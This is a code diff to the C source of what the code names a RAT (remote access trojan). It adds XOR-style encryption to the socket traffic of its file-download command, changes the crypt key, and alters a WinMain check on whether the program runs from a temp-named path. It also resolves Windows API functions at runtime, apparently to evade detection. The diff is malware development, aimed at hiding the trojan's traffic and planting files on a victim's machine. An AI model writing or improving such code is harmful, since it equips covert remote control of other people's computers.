@@ -4,7 +4,7 @@
 #include "tools.c"
 
 #define global static
-#define CRYPT_KEY 33
+#define CRYPT_KEY 28
 
 global HMODULE gLibraryKernel32;
 global _recv* gf_recv;
@@ -123,24 +123,25 @@ DownloadFile(RATSocket* ratSocket,
 {
 	char* totalReceivedData = NULL;
 	int totalBytesRead = 0;
+	int fileSize = 0;
 			
 	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = { 0 };
 	if ( gf_recv(ratSocket->socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
 	{
-		int fileSize = atoi(fileSizeBuffer);
+		EncryptDecryptString(fileSizeBuffer, FILE_SIZE_DIGIT_SIZE);
+		fileSize = atoi(fileSizeBuffer);
 
 		totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
 				
 		for (;;)
 		{
-			char writeBuffer[SOCKET_BUFFER_SIZE] = { 0 };
+			char writeBuffer[SOCKET_BUFFER_SIZE + 1] = { 0 };
 			int bytesRead = gf_recv(ratSocket->socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
 			if ( bytesRead != SOCKET_ERROR )
 			{
 #if DEBUG						
 				OutputDebugStringA(writeBuffer);
 #endif				
-
 				strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);
 
 				totalBytesRead += bytesRead;
@@ -162,6 +163,7 @@ DownloadFile(RATSocket* ratSocket,
 		OutputDebugStringA("[ERROR] Error getting file size.");
 	}
 
+	EncryptDecryptString(totalReceivedData, fileSize + 1);
 	OutputDebugStringA(totalReceivedData);
 
 	HANDLE fileHandle = gf_CreateFileA(splittedCommand[1], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -481,7 +483,7 @@ WinMain(HINSTANCE hInstance,
 	strncat_s(execPath, execPathSize, ca_tmpName, 9);
 
 #if DEBUG
-// #if !DEBUG	
+/* #if !DEBUG	 */
 	if ( 0 )
 #else
 	if ( strcmp(currentPath, execPath) != 0 )
